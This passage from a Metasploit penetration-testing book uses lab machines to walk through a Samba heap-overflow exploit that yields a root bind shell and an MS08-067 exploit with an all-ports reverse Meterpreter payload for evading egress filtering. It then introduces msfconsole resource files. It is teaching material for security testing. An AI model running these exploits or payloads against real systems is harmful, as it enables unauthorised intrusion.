class="s25">netbios-ssn </span>Samba <span class="s25">smbd 3.X (workgroup: MSHOME) MAC Address: 00:0C:29:21:AD:08 (VMware)</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://nmap.org/submit/" class="s34" target="_blank">No exact OS matches for host (If you know what OS is running on it, see </a>http://nmap.org/submit/ ).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Host script results:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_smbv2-enabled: Server doesn&#39;t support SMBv2 protocol</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| smb-os-discovery:</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| OS: Unix (Samba 3.0.24)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| Name: MSHOME\Unknown</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_ System time: 2011-03-15 17:39:57 UTC-4</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a href="http://nmap.org/submit/" class="s34" target="_blank">OS and Service detection performed. Please report any incorrect results at </a>http://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_211.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">We see three open ports: 80, 139, and 445. The message at <span class="s32">O </span>tells us that the system is running Ubuntu, and at <span class="s32">8 </span>we see that it is running a version of Samba 3.<span class="s19">x </span>and Apache 2.2.3 with PHP 5.2.1.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: justify;">Let’s search for a Samba exploit and try it against the system:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_212.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">search samba</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;samba&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:34pt" cellspacing="0"><tr style="height:10pt"><td style="width:160pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Auxiliary</p></td><td style="width:210pt" colspan="2" rowspan="2"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:160pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">=========</p></td></tr><tr style="height:11pt"><td style="width:160pt"><p class="s28" style="padding-left: 15pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Rank</p></td><td style="width:176pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:160pt"><p class="s28" style="padding-left: 15pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:176pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:160pt"><p class="s28" style="padding-left: 15pt;text-indent: 0pt;line-height: 10pt;text-align: left;">admin/smb/samba_symlink_traversal</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:176pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Samba Symlink Directory Traversal</p></td></tr><tr style="height:11pt"><td style="width:160pt"><p class="s28" style="padding-left: 15pt;text-indent: 0pt;line-height: 9pt;text-align: left;">dos/samba/lsa_addprivs_heap</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:176pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Samba lsa_io_privilege_set Heap Overflow</p></td></tr><tr style="height:10pt"><td style="width:160pt"><p class="s28" style="padding-left: 15pt;text-indent: 0pt;line-height: 9pt;text-align: left;">dos/samba/lsa_transnames_heap</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:176pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Samba lsa_io_trans_names Heap <span class="s43">Overflow</span></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Exploits</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:46.7196pt" cellspacing="0"><tr style="height:10pt"><td style="width:147pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:45pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:144pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:147pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:45pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:144pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-----------</p></td></tr><tr style="height:10pt"><td style="width:147pt"><p class="s43" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/samba/lsa_transnames_heap</p></td><td style="width:45pt"><p class="s43" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">good</p></td><td style="width:144pt"><p class="s43" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Samba lsa_io_trans_names . . .</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use linux/samba/lsa_transnames_heap</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">show payloads</span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Compatible Payloads</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:46.7196pt" cellspacing="0"><tr style="height:10pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">generic/debug_trap</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Generic x86 Debug Trap</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">generic/shell_bind_tcp</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Generic Command Shell, Bind TCP Inline</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">generic/shell_reverse_tcp</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Generic Command Shell, Reverse TCP Inline</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/adduser</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Add User</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/chmod</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Chmod</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/exec</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Execute Command</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/metsvc_bind_tcp</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Meterpreter Service, Bind TCP</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/metsvc_reverse_tcp</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Meterpreter Service, Reverse TCP Inline</p></td></tr><tr style="height:11pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/shell/bind_ipv6_tcp</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Command Shell, Bind TCP Stager (IPv6)</p></td></tr><tr style="height:10pt"><td style="width:136pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">linux/x86/shell/bind_tcp</p></td><td style="width:41pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:198pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Linux Command Shell, Bind TCP Stager</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set payload linux/x86/shell_bind_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">payload =&gt; linux/x86/shell_bind_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set LPORT 8080</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LPORT =&gt; 8080</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">set RHOST 192.168.33.132</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST =&gt; 192.168.33.132</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(lsa_transnames_heap) &gt; <span class="s24">exploit</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Creating nop sled....</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Started bind handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying to exploit Samba with address 0xffffe410...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Connecting to the SMB service...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Calling the vulnerable function...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[+] Server did not respond, this is expected</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Command shell session 1 opened (192.168.33.129:41551 -&gt; 192.168.33.132:8080)</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ifconfig</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">eth1 Link encap:Ethernet HWaddr 00:0C:29:21:AD:08</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">inet addr:192.168.33.132 Bcast:192.168.33.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 94%;text-align: left;">RX packets:3178 errors:0 dropped:0 overruns:0 frame:0 TX packets:2756 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RX bytes:292351 (285.4 KiB) TX bytes:214234 (209.2 KiB)</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Interrupt:17 Base address:0x2000</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">lo Link encap:Local Loopback</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;">inet addr:127.0.0.1 Mask:255.0.0.0</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;">UP LOOPBACK RUNNING MTU:16436 Metric:1</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0</p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">whoami</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="509" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_213.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">This type of exploit, called a <span class="s19">heap-based attack</span>, takes advantage of dynamic memory allocation, but it isn’t 100 percent reliable. (You may need to attempt the <span class="s25">exploit </span>command a few times if it doesn’t work the first time.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Notice in this example that we used a <span class="s19">bind </span>shell to set up a listener port on the target machine; Metasploit handles the direct connection to the system automatically for us. (Remember to use the reverse payload when attacking through a firewall or NAT.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark173">All-Ports Payloads: Brute Forcing Ports</a><a name="bookmark190">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In the preceding examples, we’ve relied on the reverse port always being open. But what if we’re attacking an organization with very strict egress port filtering? Most companies block outbound connections except those from a few defined ports, and it can be difficult to determine which ports can make outbound connections.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">We can guess that port 443 won’t be inspected and will allow a TCP con- nection out, and that FTP, Telnet, SSH, and HTTP may be allowed. But why guess when Metasploit has a very specific payload for use in finding open ports?</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Metasploit’s payload will try every available port until it finds an open one. (Going through the entire port range [1–65535] can take quite a long time, however.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s use this payload and have it try all ports connecting outbound until we get one that is successful:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_214.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use  windows/smb/ms08_067_netapi</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set LHOST 192.168.33.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">lhost =&gt; 192.168.33.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">smsf exploit(ms08_067_netapi) &gt; <span class="s24">set RHOST 192.168.33.130</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">rhost =&gt; 192.168.33.130</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set TARGET 3</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">target =&gt; 3</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">search ports</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;ports&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Compatible Payloads</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:34pt" cellspacing="0"><tr style="height:10pt"><td style="width:188pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:35pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:168pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:188pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:35pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:168pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:188pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">windows/dllinject/reverse_tcp_allports</p></td><td style="width:35pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:168pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Reflective Dll Injection,</p></td></tr><tr style="height:11pt"><td style="width:188pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:35pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Reverse All-Port TCP Stager</p></td></tr><tr style="height:11pt"><td style="width:188pt"><p class="s28" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">windows/meterpreter/reverse_tcp_allports</p></td><td style="width:35pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:168pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Windows Meterpreter (Reflective</p></td></tr><tr style="height:31pt"><td style="width:188pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s43" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">. . . SNIP . . .</p></td><td style="width:35pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:168pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Injection), Reverse All-Port TCP Stager</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set PAYLOAD windows/meterpreter/reverse_tcp_allports</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp_allports msf exploit(ms08_067_netapi) &gt; <span class="s24">exploit -j</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Exploit running as background job.</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(ms08_067_netapi) &gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:1 <span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Triggering the vulnerability...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (748032 bytes)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">[*] Meterpreter session 1 opened (192.168.33.129:1 -&gt; 192.168.33.130:1047) <span class="s30">8</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">sessions -l -v</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Active sessions</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">===============</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 44pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Id Type Information Connection Via</p><p class="s25" style="padding-left: 44pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-- ---- ----------- ---------- ---</p><p class="s25" style="padding-left: 44pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1 meterpreter NT AUTHORITY\SYSTEM @ IHAZSECURITY 192.168.33.129:1 -&gt; 192.168.33.130:1047</p><p class="s25" style="padding-left: 254pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploit/windows/smb/ms08_067_netapi</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">sessions -i 1</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_215.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">Notice that we do not set an <span class="s25">LPORT</span>; instead, we use <span class="s25">allports </span>because we are going to try to connect out of the network on each port until we find an open one. If you look closely at <span class="s32">O </span>you will see that our attacker machine is</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">bound to <span class="s25">:1 </span>(all ports) and that it finds a port outbound on port 1047 <span class="s32">8 </span>on</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">the target network.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark174">Resource Files</a><a name="bookmark191">&zwnj;</a></p><p class="s19" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Resource files <span class="p">are script files that automate commands within </span>msfconsole<span class="p">. They contain a list of commands that are executed from </span>msfconsole <span class="p">and run sequen- tially. Resource files can greatly reduce testing and development times, allow- ing you to automate many repetitive tasks, including exploitation.</span></p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">Resource files can be loaded from <span class="s19">msfconsole </span>with the <span class="s25">resource </span>command, or they can be passed as a command-line argument with the <span class="s25">-r </span>switch.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The simple example shown next creates a resource file that displays our Metasploit version and then loads the sounds plug-in:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_216.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 70%;text-align: left;">root@bt:/opt/framework3/msf3/ <span class="s24">echo version &gt; resource.rc </span><span class="s30">O </span>root@bt:/opt/framework3/msf3/ <span class="s24">echo load sounds &gt;&gt; resource.rc </span><span class="s30">8 </span>root@bt:/opt/framework3/msf3/ <span class="s24">msfconsole -r resource.rc </span><span class="s30">@</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O <span class="s25">resource (resource.rc)&gt; version</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Framework: 3.7.0-dev.12220</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Console : 3.7.0-dev.12220 resource (resource.rc)&gt; load sounds</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Successfully loaded plugin: sounds msf &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" 